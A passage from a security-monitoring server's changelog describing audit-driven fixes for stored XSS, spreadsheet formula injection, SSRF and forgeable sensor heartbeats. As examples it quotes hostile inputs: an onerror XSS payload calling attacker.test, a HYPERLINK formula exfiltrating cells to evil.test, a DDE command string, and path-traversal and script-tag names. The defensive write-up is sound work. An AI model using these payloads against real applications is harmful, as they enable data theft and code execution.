`docs/OPERATIONS.md` so the team knows what NOT to expect.

- **SSO / OIDC / SAML integration — out of scope.** Deploy
  Archer behind an authenticating reverse proxy that handles
  it; the in-tree SSO client doesn't match Archer's
  operator-pragmatic scope. Recorded in MATURATION_PLAN
  section 5.

- **Multi-tenant separation — out of scope.** Single-tenant by
  design. Separate deployments for separate teams. Adding
  per-tenant findings views and RBAC would distort the schema
  and UI without serving the intended audience.

- **Metrics endpoint (`/metrics`) — roadmapped, not yet.**
  See MATURATION_PLAN section 11d-2 for the refined
  implementation sketch: counts and histograms only (no
  findings detail — scrape ports are usually less protected
  than the SPA, so finding labels would functionally become
  an exfil vector), gated either via a separate localhost-
  only port (Prometheus over SSH tunnel / sidecar) OR an API
  token in `Authorization` header — explicitly NOT behind SPA
  session auth (breaks scraping ergonomics, tempts session-
  TTL extension regressions on NEW-8), and explicitly NOT
  public (sensor names + finding counts are reconnaissance
  fodder for an insider attacker).

## [v0.13.0] — 2026-05-10

Fifth audit-driven correctness release. Five items (NEW-25 through
NEW-29) plus a three-item low-priority cluster surfaced by the
2026-05-10 external review (sixth pass on the codebase). Two of
the items are the auditor's own correction to a previous
"no XSS today" claim — re-reading the SPA more thoroughly turned
up two real innerHTML sinks in `notifications.js` and
`campaigns.js` that the prior round had missed. The fixes are
mechanical (`_esc()` wraps), but pairing them with feed-ingest
shape validation closes both the rendering and ingest sides of
the path.

The unifying theme this round: **defense-in-depth at every
boundary**. The XSS path (NEW-26 / NEW-27) is closed by frontend
escape, AND by feed-ingest shape validation (NEW-28). The TLS
auto-gen narrowing (NEW-25) is paired with operator-CA cert
validation so both halves of the cert workflow surface clear
errors. The SSE silent-drop fix (NEW-29) trades best-effort
delivery for explicit "I missed events; re-sync" semantics
because a security tool's live channel can't afford to silently
swallow CRITICAL alerts. Recorded as a maturation lesson in
MATURATION_PLAN section 8.

### Added

- **Per-module `_esc()` helpers in notifications.js and
  campaigns.js (NEW-26, NEW-27).** Same shape as the existing
  helpers in detail.js and feeds.js; kept private to each
  IIFE-scoped module to match codebase convention. Escapes
  `&`, `<`, `>`, `"`, `'` so both HTML-text and attribute
  contexts (e.g. `title="${...}"`) are safe. Pre-fix
  `notifications.js` rendered server-supplied `severity`,
  `type`, `src_ip`, `dst_ip`, `dst_port` directly into
  innerHTML; `campaigns.js` rendered `e.dst` (in two places —
  `title=` attribute and cell body), `e.srcs`, and `e.ip` the
  same way. Reachable via TI Hit findings whose dst_ip carried
  a malicious indicator from a feed; the feed-ingest
  validation in NEW-28 closes the upstream, this is defense-
  in-depth on the rendering side. Audit 2026-05-10
  NEW-26/NEW-27.

- **`internal/feeds/validate.go` indicator shape validation
  (NEW-28).** New `validDomain()` (RFC 1035-ish regex with
  leading-underscore concession for SRV-style records, 253-char
  cap) and `validHash()` (hex of length 32/40/64/128). Wired
  into `normalizeMISPAttribute` (domain/hostname/md5/sha1/
  sha256 branches) and OpenCTI `stixValue`-extracted indicator
  classification (Domain-Name/Hostname/StixFile branches).
  Pre-fix any non-empty `TrimSpace`'d string was accepted as a
  "domain" indicator; combined with the rendering bugs in
  NEW-26/NEW-27, a malicious indicator like
  `<img src=x onerror=fetch('//attacker.test')>` could land a
  stored XSS that fired in every admin browser when the
  notification panel or campaigns view rendered. The shape
  control rejects this at the boundary. New
  `validate_test.go` exercises both validators across realistic-
  domain / malicious-shape / canonical-hash / wrong-length
  cases plus end-to-end normalizer regression tests.

- **SSE `resync_required` overflow canary (NEW-29).** Pre-fix a
  slow consumer's full buffer caused `Publish` to silently drop
  events; for a security tool whose live channel includes new
  TI hits, unauthorized sensor attempts, and CRITICAL findings,
  silent drops are a real information-loss bug. Post-fix the
  broker drains the channel and inserts a single
  `resync_required` event when the buffer fills, then no-ops
  further publishes until ServeHTTP delivers the canary and
  flips the per-client overflow flag back off. Frontend
  (sse.js + app.js) handles the event by re-fetching
  `/api/findings` and `/api/notifications` — the source-of-
  truth endpoints the dropped events would have updated. New
  `sse_broker_test.go` covers overflow → canary, no-op-after-
  overflow, and healthy-consumer-no-canary cases.

- **`loadAndValidateOperatorTLS()` for path-1 cert/key check.**
  Parses the cert and key on load; surfaces clear startup
  errors for expired (`cert ... expired ...`), corrupt, or
  key-mismatched (`key ... does not match cert ... public
  key`) files, naming the file in each error. Falls back
  through PKCS#8 → PKCS#1 → SEC1 PEM formats so an operator
  who generated the key with `openssl ecparam -genkey` (SEC1
  form) or `openssl genrsa` (PKCS#1) gets a working cert
  rather than a parse error. Pre-fix only file existence was
  checked, so an expired/corrupt/key-mismatched cert silently
  passed through and the listener failed at first sensor
  connect with a cryptic OpenSSL-flavored error. Audit
  2026-05-10 follow-up to NEW-25.

- **Eight new regression tests** —
  `TestValidDomain_AcceptsRealDomains` /
  `TestValidDomain_RejectsMaliciousAndMalformed` (NEW-28),
  `TestValidHash_AcceptsCanonicalLengths` /
  `TestValidHash_RejectsBadShapes` (NEW-28),
  `TestNormalizeMISPAttribute_RejectsMaliciousDomain` /
  `TestNormalizeMISPAttribute_RejectsMalformedHash` (NEW-28),
  `TestBrokerPublish_OverflowEmitsResyncRequired` /
  `TestBrokerPublish_NoOpAfterOverflow` /
  `TestBrokerPublish_NoOverflowOnHealthyConsumer` (NEW-29),
  `TestEnsureTLS_AutoGenIsServerOnly` (NEW-25),
  `TestEnsureTLS_RejectsExpiredOperatorCert` /
  `TestEnsureTLS_RejectsKeyMismatch` (NEW-25 follow-up),
  `TestEnsureTLS_AcceptsValidOperatorECDSA` (multi-format PEM
  fallback).

### Changed

- **Auto-gen TLS cert is now server-only end-entity (NEW-25).**
  Pre-fix template had `IsCA=true` and
  `KeyUsage: DigitalSignature | CertSign`. Pinned-pubkey
  verification doesn't care about chain shape — sensors
  match the cert's `SubjectPublicKeyInfo`, not the chain — so
  the IsCA flag was functionally ignored by current
  consumers. The risk was one step removed: if the cert ever
  ended up in a system trust store (operator runs
  `update-ca-certificates`, copies it to a workstation,
  container build adds it to the trust bundle), it became a
  CA for any domain anyone with read access to
  `/data/server.key` wanted to sign. The private key sits at
  mode 0o600 in the data volume, so anyone with shell access
  to that mount had CA signing capability, not just server-
  impersonation. New posture: `IsCA=false`,
  `KeyUsage: DigitalSignature | KeyEncipherment`,
  `ExtKeyUsage: ServerAuth`. No behavior change for any
  current or future legitimate consumer. Path 1 (operator-
  supplied cert) is independent — operator brings whatever
  shape their CA issues; the narrowing only affects the
  auto-gen path.

- **`localIPs()` filters IPv6 link-local addresses from cert
  SAN.** No sensor talks to a `fe80::/10` address — link-local
  addresses are interface-scoped and require zone identifiers
  to be reachable. Pre-fix they were emitted into the SAN list
  alongside loopback (which was already filtered); now both
  are filtered. Just bloat removal; no behavior change for any
  legitimate connection. Audit 2026-05-10 LOW.

- **`statfsBytes` computes in `uint64` and clamps on overflow.**
  Pre-fix the multiplication `int64(st.Bavail) * int64(st.Bsize)`
  on uint64 inputs could overflow signed int64 on a sufficiently
  large filesystem (PB-class today, EB-class on a future host),
  silently rendering negative bytes in the UI. Post-fix computes
  in uint64 and clamps to `math.MaxInt64` before conversion.
  Theoretical at homelab/team scale, fixed for correctness.
  Audit 2026-05-10 LOW.

- **Disk-usage `BySensor` breakdown filters against enrolled
  sensor name set.** Pre-fix any subdirectory under `logsDir`
  showed up in the per-sensor breakdown, including manually-
  dropped trees (`/logs/test/`, leftover analyst stashes).
  Accurate-but-confusing reporting. Post-fix the per-sensor
  list only names directories whose name matches an enrolled
  sensor; the total still includes orphan directories' bytes
  (they're real on disk) but they don't pose as sensors in the
  UI. Audit 2026-05-10 LOW.

### Fixed

- **Stored XSS reachable via feed-injected indicators (NEW-26
  + NEW-27 + NEW-28).** Three-layer fix — frontend escape in
  the two innerHTML sinks the previous audit round missed,
  plus shape validation at the feed-ingest boundary so a
  malicious indicator can't reach the matcher in the first
  place. The auditor's framing on this round captures the
  lesson: a positive claim about a surface ("the SPA escapes
  consistently") needs every file on that surface read, not a
  representative sample. Recorded in MATURATION_PLAN
  section 8.

- **SSE silent drops on slow-consumer overflow (NEW-29).** See
  "Added" above for the resync_required design. Bandwidth-
  budgets-and-buffer-sizing tradeoffs — the 32-event cap was
  fine for normal load and lets the overflow path handle the
  pathological case explicitly rather than expanding the
  buffer to mask the problem.

- **TLS auto-gen cert IsCA overscoping (NEW-25).** See
  "Changed" above.

- **Operator-supplied TLS cert/key now fail loudly at startup
  on expired / corrupt / key-mismatched files.** Same
  motivation as NEW-25 — clear startup error beats cryptic
  TLS handshake failure 30 seconds later.

### Maturation lesson

- **Asserting a positive across surfaces requires reading
  every surface.** The "no XSS today" claim from the v0.12.0
  audit round was a partial sample (four SPA files read; two
  not read were the ones with the bugs). Recorded in
  MATURATION_PLAN section 8 with two implications: claims
  about a property holding across N files need to be either
  exhaustively verified or stated as conditional ("no XSS in
  the four files I read"). For future audit rounds, prefer
  the conditional form unless the verification was actually
  exhaustive.

## [v0.12.0] — 2026-05-10

Fourth audit-driven correctness release. Eleven items (NEW-14
through NEW-24) plus a five-item low-priority cluster surfaced by
the 2026-05-10 external review (fifth pass on the codebase). Mix
of analyst-injection / SSRF / spreadsheet-injection attack
surfaces, a Quiver-protocol bump (per-sensor HMAC), an x509
fixture-vs-reality drift, an archive-layout collision, and the
usual cluster of small-scale efficiency and ergonomics work.

The reviewer's framing this round: "the detection paths are clean,
the auth/middleware is clean, the storage layer is clean — what's
left are surface-area bugs in inputs from untrusted-or-semi-
trusted parties (analyst at /api/import, sensor at
/api/quiver/checkin) and data sinks that get rendered/opened by
other tools (XLSX/CSV → Excel, feed URLs → HTTP fetcher)." That's
a real signal — boundary-layer validation discipline is the
remaining maturity step toward team-deployed scenarios. Every
external-facing entry point now canonicalizes on entry and
escapes on egress; recorded as a maturation lesson in
MATURATION_PLAN section 8.

A separate procedural lesson from NEW-20/24: the x509
detector's validity-window check was silently dead in production
because the goldens were hand-written with RFC3339 timestamps
while real Zeek default JSON output emits Unix-epoch floats. The
fixture matched the parser's wrong expectation rather than
upstream's actual behavior, so the bug stayed invisible across
five audit rounds. Rewriting the affected fixtures to Zeek's
real wire format was a one-time correction; preventing the class
failure mode is procedural — captured in MATURATION_PLAN as
"audit fixtures against reality periodically."

### Added

- **Per-sensor HMAC-SHA256 secret for checkin authentication
  (NEW-16, Quiver protocol v2).** Pre-v2 the `/api/quiver/checkin`
  endpoint trusted the `name` field alone — anyone who knew (or
  guessed) a sensor's name could POST a checkin and forge the
  `last_seen_at` heartbeat that admins use to know "is my sensor
  alive." Sensor names are short, operator-chosen strings; they
  aren't secrets in the design. New `checkin_secret` column on
  the `sensors` table (migration 0007), generated server-side at
  enrollment, returned exactly once in the enroll response, and
  persisted at `/etc/quiver/secret` (mode 0600 owned by the
  quiver user) on the sensor side. `quiver.sh` signs each checkin
  body with HMAC-SHA256 (via `openssl dgst`) and sends the hex
  digest in `X-Quiver-Sig`. Server uses `hmac.Equal` for
  constant-time comparison; signature failure routes to the
  unauthorized-attempt path so the admin sees the forgery
  attempt without the forger learning whether the name itself
  was valid. New regression tests
  `TestQuiverCheckin_HMACRequired` (valid/wrong/missing/garbage
  signatures) and `TestQuiverCheckin_BodyTamperingDetected`
  (replay protection — flipping any byte invalidates the
  signature). See `### Breaking` for the upgrade path.

- **`spreadsheetSafe()` helper for CSV/XLSX export sanitization
  (NEW-17).** Defuses spreadsheet formula injection. Cells whose
  first character is `=`, `+`, `-`, `@`, `\t`, or `\r` are
  prefixed with a single quote so Excel/Sheets/LibreOffice treat
  them as text instead of formulas. Real exposure: an analyst
  writes a note like
  `=HYPERLINK("https://evil.test/x?d="&A1, "Click")` and the
  admin opening the export hovers/clicks → row data exfiltrates
  to `evil.test`. Older Excel had `=cmd|'/c calc'!A1` as a
  DDE-RCE; mostly killed by recent Office security defaults but
  not gone. Standard OWASP CSV-injection mitigation; applied to
  every operator-supplied or parser-supplied string field on
  every export sheet. Audit 2026-05-10 NEW-17.

- **`rejectInternalFeedURL()` / `isInternalAddr()` SSRF guard
  (NEW-18).** Refuses feed URLs whose host is a literal IP in
  the loopback / link-local / RFC1918 / IPv6 unique-local deny
  set, plus loopback aliases (`localhost`,
  `ip6-localhost`, `ip6-loopback`). Two-layer defense: config-
  time guard (this) for syntactic IP literals, fetch-time guard
  (`CheckRedirect` in `feeds.httpClientWithTLS`) for hostnames
  that resolve into internal space — including a redirect target
  that points there. CheckRedirect is also bounded at 5 hops to
  cap the redirect-amplifier surface. Audit 2026-05-10 NEW-18.

- **`Store.UpdateFeedRefreshState` / `UpdateFeedStatus` targeted
  column updates (NEW-22).** Replaces full-row `UpdateFeed` calls
  in the feed-refresh path. Pre-fix a refresh that took 90s on a
  large MISP held a stale snapshot of the row; an admin PUT to
  `/api/feeds/{id}` (URL rotation, API-key rollover) landing
  mid-fetch was silently reverted when the refresh wrote the
  snapshot back. Now the refresh path touches only the columns
  it owns (status, last_refresh_at, last_full_refresh_at,
  last_indicator_count, last_fetch_truncated, last_error);
  admin-owned columns (URL, APIKey, Name, IndicatorAgingDays,
  Enabled, TLSSkipVerify) flow exclusively through `UpdateFeed`.
  Audit 2026-05-10 NEW-22.

- **`Store.ResetEnrollmentToken()` rollback (NEW-19).** Used by
  the enrollment handler when a step *after* token consumption
  fails (authorized_keys write, log dir creation, sensor row
  insert). Pre-fix the existing `RemoveAuthKey` rollback partially
  captured the transactional intent, but `ConsumeEnrollmentToken`'s
  `used_at` flip never reverted — leaving the operator with a
  permanently-burned token and no sensor row. `ResetEnrollment-
  Token` clears `used_at` and `consumed_by` so the operator can
  retry without minting a new token.

- **`parseZeekCertTime()` accepts both Unix-epoch float and
  RFC3339 (NEW-20).** Closes the silently-dead validity-window
  check on real Zeek output. See "Fixed" for the bug detail.

- **`ScheduleWakeup`-equivalent helper for fleet-scale UI: per-
  sensor `lastLogMTime` cache.** 5-second TTL on the on-disk
  walk that powers the "last seen" column in the Sensors modal.
  Pre-cache a 50-sensor fleet with a busy log tree spent ~100ms
  stat'ing files per UI tick; cached the cost is amortized to
  one walk per sensor per 5 seconds.

- **Eight new regression tests** —
  `TestImport_RejectsFabricatedFindings` (NEW-14: rejects
  unknown Type, out-of-range Score, bogus Severity, malformed
  Timestamp, bogus Status); `TestImport_RejectsCorruptJSON`;
  `TestRejectInternalFeedURL_LiteralIPs` (NEW-18: AWS metadata,
  loopback v4/v6, RFC1918, localhost alias all rejected; public
  IPs and FQDNs pass); `TestRandomMinute_DistributionIsUnbiased`
  (60K draws, ±20% per bucket — verifies rejection sampling
  fixed the modulo bias); `TestSpreadsheetSafe_PrefixesDangerous-
  LeadingChars` (NEW-17 cell sanitization); `TestQuiverHost_
  ValidatedAtEnrollment` (LOW: control characters and HTML in
  host field rejected); `TestQuiverCheckin_HMACRequired` (NEW-16
  4-way: valid/wrong/missing/garbage signatures); `TestQuiverCheckin_
  BodyTamperingDetected` (NEW-16 replay defense);
  `TestParseZeekCertTime_BothFormats` (NEW-20 float + RFC3339
  + edge cases); `TestPurgeSensorLogs_DoesNotCollideOnHyphen-
  atedNames` (NEW-21); `TestRotateSensorLogs_SuffixesOnSame-
  DayCollision` (NEW-21).

### Changed

- **`/api/import` is now admin-only (NEW-14).** Pre-fix gated to
  analyst+, which violated the boundary "findings come from the
  analyzer; analysts annotate." An analyst could fabricate a
  Critical TI Hit on any IP they wanted flagged, and the stored
  representation was indistinguishable from analyzer-emitted
  findings once it lived in the DB. Admin-only matches the
  principle that configuration changes (allowlist / IOC list,
  both also written by `/api/import`) belong to admins.

- **`/api/import` now caps body at 64 MiB and validates every
  finding before applying (NEW-14).** New `validateImported-
  Finding()` rejects unknown Types (the analyzer's
  `ScoreExplanations` map plus the legacy `"Threat Intel Hit"`
  is the canonical set), Severities outside the 5 model
  constants, Scores outside [0, 100], Timestamps that don't
  parse as `2006-01-02 15:04:05`, and Statuses other than
  open / acknowledged / escalated. Whole-import failure on any
  bad finding rather than partial application.

- **Sensor checkin now validates `name` against the same
  `validSensorName` regex as enrollment (NEW-15).** Pre-fix only
  `name != ""` was checked, so a malformed name (e.g.
  `<script>alert(1)</script>` or `../../etc/passwd`) flowed into
  log lines, the SSE `unauthorized_attempt` event, the Sensors-
  modal table, and any future export of unauthorized attempts.
  The SPA escapes today, so the immediate XSS vector was closed
  by defense-in-depth on the frontend — but the SQL row, log
  entry, and any non-HTML sink (CSV export, JSON API consumers)
  still received the raw payload. Validating once at enrollment
  but not at checkin was the asymmetry. Audit 2026-05-10 NEW-15.
  *(Auditor's note: the original "stored XSS reaching every
  admin in real time" framing was downgraded mid-review after
  the auditor read the SPA's `_esc()` discipline; the
  defense-in-depth argument is the standing motivation.)*

- **Sensor disenroll now resumes from the `disenrolling` state
  (NEW-23).** Pre-fix the handler rejected anything other than
  `"enrolled"`, which included sensors stuck in `"disenrolling"`
  from a server crash or `SetSensorStatus` failure mid-sequence.
  The admin then had no path through the UI to complete the
  disenroll; they had to edit SQLite manually. Every step in the
  sequence is already idempotent
  (`RemoveAuthKey`/`rotateSensorLogs`/`RetagFindings`); resuming
  from `disenrolling` reuses that resilience.

- **Archive-rotation layout changed from
  `/_archived/<name>-<stamp>/` to `/_archived/<name>/<stamp>/`
  (NEW-21).** Closes the prefix-collision purge bug.
  `validSensorName` allows hyphens, so sensors named `abc` and
  `abc-east` produced archive directories with overlapping
  prefixes; the matching `purgeSensorLogs` used
  `HasPrefix(name + "-")`, so purging `abc` would also wipe
  `abc-east`'s archive. Naming conventions like
  `region-hostname` are common for sensor fleets, so the
  collision wasn't theoretical. Nesting moves the per-sensor
  namespace into a directory rather than a path prefix; purge
  becomes a single `os.RemoveAll(/_archived/<name>)` with no
  prefix matching, no collision possible. Existing
  `/_archived/<name>-<stamp>/` directories from pre-v0.12.0
  installs are left in place — they'll continue to work for
  reads, but a future purge of those names will not pick them
  up. Operators with hyphenated sensor names that haven't been
  purged should rename the legacy archive directories to the new
  layout (or accept the leftover directories will require
  manual cleanup).

- **`upsertFeedIndicatorBatch` now uses one `INSERT ... ON
  CONFLICT DO UPDATE RETURNING` per row instead of a
  SELECT-then-INSERT-or-UPDATE pair.** Three SQL round-trips per
  indicator → one. On a 1M-attribute MISP refresh that's 2M
  fewer queries. New migration 0008 adds the
  `(feed_id, indicator)` UNIQUE index the ON CONFLICT requires,
  with a defensive dedupe sweep that keeps the highest-id row
  per pair. Audit 2026-05-10 LOW.

- **`weird.go` reads `notice` field via `parser.GetBool` instead
  of `GetStr`.** Pre-fix `GetStr` produced literal `"true"` /
  `"false"` strings via `json.Marshal` on the underlying bool,
  so the detail-line concatenation
  `if notice != "" && notice != "-"` always fired and produced
  `"Zeek weird: x | true"` for any record. New emit shape is
  `Zeek weird: x (also notice)` only when actually noticed.
  Audit 2026-05-10 LOW.

- **`randomMinute()` now uses rejection sampling** instead of
  `b % 60`. 256 / 60 = 4 rem 16, so `b % 60` made minutes 0–15
  each map from 5 byte values while 16–59 each map from 4 — a
  small but real bias. Drawing fresh bytes until one falls in
  [0, 240) eliminates the bias. Tiny issue in practice; fixed
  for inelegance. Audit 2026-05-10 LOW.

- **Sensor enrollment validates `req.Host`** with a permissive
  regex (alnum + `.`, `-`, `_`, `:` for IPv6, capped at 253
  chars). Pre-fix the host field flowed unvalidated into the
  sensors row and admin-facing sinks (Sensors modal, JSON
  exports, log lines). The SPA escapes today but the asymmetry
  with `name`'s validation was a latent risk. Audit 2026-05-10
  LOW.

### Fixed

- **Analyst-injection of fabricated findings via `/api/import`
  (NEW-14).** See "Changed" above for the full mitigation —
  admin gate plus body cap plus per-finding validation.

- **Quiver checkin heartbeats are no longer forgeable (NEW-16).**
  See "Added" above — per-sensor HMAC. The Forged-by-design
  semantic of v1 checkins is closed by the v2 cutover.

- **CSV/XLSX exports defuse spreadsheet formula injection
  (NEW-17).** Every operator-supplied or parser-supplied string
  field passes through `spreadsheetSafe` before being written to
  any sheet of the XLSX export and any cell of the CSV export.

- **Feed URL configuration refuses obvious internal addresses
  (NEW-18).** Two-layer guard — see "Added" for both layers'
  scope.

- **Enrollment failure no longer permanently burns the token
  (NEW-19).** `ResetEnrollmentToken` is invoked on every failure
  path between successful `ConsumeEnrollmentToken` and successful
  `CreateSensor` so the token becomes reusable.

- **x509 validity-window detection now fires on real Zeek
  output (NEW-20).** Default Zeek JSON output encodes the `time`
  type as a Unix-epoch float (`"1700000000.0"`); pre-fix
  `time.Parse(time.RFC3339, ...)` failed on every production
  capture, both `err1` and `err2` were non-nil, and the entire
  short-validity / >10-year-validity check block was silently
  skipped. The bug was invisible because the golden fixture
  happened to use RFC3339 strings — the fixture matched the
  parser's wrong expectation rather than upstream's actual
  behavior. New `parseZeekCertTime` tries float first
  (production reality), RFC3339 second (custom Zeek configs).
  `x509_long_validity` and `x509_short_validity` fixtures
  rewritten to use Unix-epoch floats; `x509_self_signed` and
  `x509_default_subject` retain RFC3339 inputs to exercise the
  fallback path. Audit 2026-05-10 NEW-20.

- **Sensor archive purge no longer over-deletes hyphenated-
  prefix neighbors (NEW-21).** See "Changed" above.

- **Concurrent feed refresh and feed PUT no longer race
  destructively (NEW-22).** Targeted column updates — see "Added"
  above.

- **Disenroll mid-sequence failures are now resumable (NEW-23).**
  See "Changed" above.

- **`x509` fixtures now match Zeek's real wire format (NEW-24).**
  See NEW-20 for the bug; the fixture rewrite is the procedural
  half of the fix. Recorded in MATURATION_PLAN as a class lesson:
  hand-written fixtures embed the author's interpretation of the
  upstream's wire format rather than its reality, which can mask
  parser bugs across many audit cycles.

### Detection changes

- **Validity-window indicators (`short validity` and `validity
  > 10 years`) are now actually emitted on real Zeek output.**
  Pre-fix they were silently never produced because of NEW-20's
  timestamp parsing bug. Operators running production Archer
  installs that previously saw 0 validity-window findings should
  expect real rates to surface in their next analysis run.
  `Suspicious Certificate` (the wrapper finding type) was still
  firing for self-signed and default-subject indicators, which
  was the only reason the dead path went unnoticed.

### Breaking

- **Quiver protocol v1 dropped (NEW-16).** v0.12.0+ servers
  require sensors to speak protocol v2 (per-sensor HMAC on
  every checkin). v1 enrollments and v1 checkins are rejected
  with the existing `protocol_unsupported` error shape; the
  operator's upgrade path is to re-run the install one-liner
  from the Archer admin UI on each sensor — same flow as the
  initial install, including a fresh enrollment token. The
  in-band path of "issue a secret to a v1 sensor over an
  existing channel" wasn't safe (no authenticated channel
  existed pre-v2), so re-enroll IS the upgrade. There is no
  one-cycle compatibility window because every checkin from a
  v1 sensor would be unauthenticated and the audit's whole
  point is to close that — supporting both during a window
  defeats the fix.

- **`/api/import` role gate changed from analyst+ to admin-only
  (NEW-14).** Existing admin-driven `/api/import` automation
  unchanged; analyst-driven automation must either escalate to
  an admin token or be retired. The endpoint was rarely used
  outside config-restore flows, which are admin-shaped anyway.

- **Sensor archive layout changed from `/_archived/<name>-
  <stamp>/` to `/_archived/<name>/<stamp>/` (NEW-21).** Existing
  pre-v0.12.0 archive directories continue to be readable but
  won't be picked up by future `purgeSensorLogs` calls. See
  "Changed" above for the manual-cleanup note.

## [v0.11.0] — 2026-05-10

Third audit-driven correctness release in three days. Seven
medium/high issues (NEW-7 through NEW-13) plus a low-priority
cluster surfaced by the 2026-05-10 external review (fourth pass on
the codebase). The auditor's meta-point this round: shared
constant maps and operator-time references both have a "single
source of truth" failure mode — duplicate the map keys in two
places, or skip operator timezone in one of three boundary
calculations, and the bug is silent. NEW-9 (typo'd map keys
falling through to a wide scan) and NEW-12 (watch boundary in UTC
while findings filter is in operator-local) are the same shape,
recorded in MATURATION_PLAN section 8.

### Added

- **`internal/store.Store.findingsIdx` id→slice-index map for
  O(1) finding lookup.** `GetFinding` / `UpdateFinding` /
  `AddNote` walked the entire findings slice linearly on every
  call. Long-running installs accumulate 5-10k preserved
  historical findings; analyst hot paths (status flip, note
  add) added ms-scale jitter the SSE stream amplified. Index
  rebuilt in lockstep with every slice rewrite (load loop,
  SetFindings, ClearFindings, PruneFindingsBefore) via a single
  `rebuildFindingsIdx` helper so the consistency invariant is
  one function call. New `TestFindingsIdx_StaysConsistentAcross-
  Mutations` exercises every mutation path. Follow-up to the
  audit, not a discrete NEW item.

- **`TestLogTypesForFinding_CoversAllEmittedTypes` consistency
  test.** Walks every `expected_findings.json` in the analyzer
  goldens, extracts every distinct `Type` value, and asserts each
  has an entry in `internal/server.logTypesForFinding`. Future
  analyzers adding a finding type without a corresponding pivot
  entry now break the test instead of silently degrading the
  raw-log pivot to scan-everything fallback. NEW-9 follow-up.

- **`TestDampenComposite_*` unit tests.** Cover the new
  log-scale damping curve (asymptotic toward 99 above raw=75,
  identity below), monotonicity over [0, 500], and the never-
  exceeds-99 cap. NEW-10 follow-up.

- **`TestRequireAuth_RejectsNonActiveStatus`,
  `TestDeleteSessionsForUser_DropsAllSessions`,
  `TestSuppressions_RejectsInvalidDays`,
  `TestSuppressions_DeleteUnescapesPath`,
  `TestMoveFile_NonEXDEVErrorSurfaces` regression tests.** Cover
  NEW-7, NEW-8, NEW-13, and the LOW PathUnescape fix.

### Changed

- **`Store.IsSuppressed` is now a pure read; suppression cleanup
  moved to a periodic sweep loop.** Audit 2026-05-10 cosmetic
  deferred from v0.10.0. Pre-fix the read path took a write lock
  and ran `DELETE FROM suppressions WHERE target = ?` on every
  call that observed an expired entry; two concurrent filter
  requests for the same expired IP both ran the (idempotent)
  DELETE and the hot read path took the writer lock for
  no-correctness-benefit work. Considered: singleflight around
  the DELETE so concurrent peeks coalesce. Preferred: move the
  cleanup off the read path entirely. Shipped: `IsSuppressed`
  is RLock-only and treats expired entries as not-suppressed
  without mutating; `GetSuppressions` filters expired on read so
  the admin UI never lists a stale row; new
  `Store.PruneExpiredSuppressions` runs one bulk
  `DELETE … WHERE expiry <= now()` and a single map walk under
  the write lock; new `Server.startSuppressionsPruneLoop`
  spawns a 5-minute-cadence sweep goroutine on server start
  (sibling of the existing unauthorized-attempts prune loop).
  Boot-time prune in `InitDB` already exists for cold-start
  catch-up.

- **SSE `Publish` now splits multi-line `Data` payloads across
  separate `data:` lines per the SSE spec.** Pre-fix any literal
  `\n` in `evt.Data` prematurely terminated the event ("\n\n" is
  the record separator) and the rest of the payload was parsed
  by the browser as a free-form continuation. JSON serializers
  don't emit interior newlines today, but operator-supplied
  strings — analyst notes, error messages from third-party
  feeds — can leak them in via codepaths whose escaping isn't
  verified. Audit 2026-05-10 LOW.

- **`handleDeleteSuppression` now `url.PathUnescape`s the key
  before lookup.** Frontend percent-encodes suppression keys
  containing `/` or `%` (e.g. CIDR ranges); pre-fix the trim+
  raw-pass meant the encoded form never matched the stored
  entry and the delete silently no-op'd from the analyst's POV.
  Malformed escapes return 400 instead of guessing. Audit
  2026-05-10 LOW.

- **`Store.ConsumeEnrollmentToken` UPDATE now atomic on the
  WHERE clause.** Pre-fix the validation was a SELECT-then-
  UPDATE pair relying on `s.mu` for serialization. Mutex held
  across both statements is correct today, but TOCTOU was
  latent: anything bypassing the lock (or removing it for perf)
  would let two sensors successfully enroll against the same
  single-use token. The fix collapses the check into the WHERE
  clause (`token=? AND used_at=0 AND expires_at>?`) so the
  predicate is enforced by SQLite itself; `rowsAffected==0`
  means the token was already consumed or expired regardless of
  when. Audit 2026-05-10 LOW.

- **Archive dry-run preview now mirrors the real run's
  destination-collision skip.** Pre-fix the dry-run counted
  every eligible source as movable; the real run silently
  turned half of them into Skipped on a re-trigger, so admins
  saw "23 files / 4.1 GiB" preview → "12 files / 2.1 GiB, 11
  skipped" actual. Now the preview runs the same `os.Stat(dst)`
  collision check (read-only, no MkdirAll) so the counts agree.
  Audit 2026-05-10 LOW.

### Fixed

- **Suppression endpoint rejects `NaN` / `±Inf` / out-of-range
  `days` (NEW-7).** Pre-fix only `days > 0` was checked, so
  `{"days": 1e15}` overflowed `int64` inside `time.Duration`
  construction (1e15 × 86400e9 wraps the signed int64 ceiling
  to a negative or pathological value). Resulting expiry could
  land in the past (suppression immediately false) or thousands
  of years out (effectively forever); NaN/Inf gave undefined-
  behavior conversions. Both surfaces were soft-DoS / audit-
  bypass shapes for an analyst with POST access to
  `/api/suppressions`. New explicit `math.IsNaN` / `math.IsInf`
  rejection plus a `(0, 365]` finite range. 365-day cap is
  generous (longest realistic suppression window) and bounds
  the duration math comfortably within int64.

- **Session validity now re-checks user `Status` on every
  request (NEW-8).** Pre-fix `requireAuth` trusted whatever
  status was in the database row at session creation; an admin
  demoting a user from active → pending or marking an account
  compromised had no effect on the user's existing 24-hour
  session. Now `requireAuth` reads the user row each request
  via `GetSession` → `GetUserByID` and 401s any non-active
  status, dropping the in-memory token at the same time so a
  status flip-back doesn't silently re-validate. Admin-side
  mutation paths (`ApproveUser`, `UpdateUserRole`, `DeleteUser`)
  additionally call new `UserStore.DeleteSessionsForUser` so
  the in-memory session map doesn't hold orphans that would
  401 every request until natural 24-hour expiry.

- **`logTypesForFinding` map keys now match every analyzer-
  emitted `Finding.Type` (NEW-9).** Four keys silently
  disagreed with what analyzers emit: `"DNS Tunnel"` (analyzer
  emits `"DNS Tunneling"`), `"NXDOMAIN Flood"` (vs `"DNS
  NXDOMAIN Flood"`), `"No-SNI"` (vs `"SSL No-SNI"` /
  `"SSL No-SNI on C2 Port"`), `"Weird Event"` (vs `"Protocol
  Anomaly"`). `Host Risk Score` had no entry at all. The
  lookup-miss fallback at `handleFindingRaw` scans the wide
  `{conn, http, dns, ssl}` set, so the pivot returned records
  but from the wrong protocols, and the analyst saw mixed
  results. Keys aligned; new `SSL No-SNI on C2 Port` and `Host
  Risk Score` entries added. Compile-time consistency test
  (above) prevents future analyzer additions from drifting
  again.

- **`risk.go` log damping now actually log-damps (NEW-10).**
  The pre-fix code clamped via `math.Min(composite, 99)` while
  the comment claimed log-scale damping. Two saturated hosts
  (raw=120 and raw=300) both reported `"99"` — losing the
  relative signal the analyst used to triage which host was
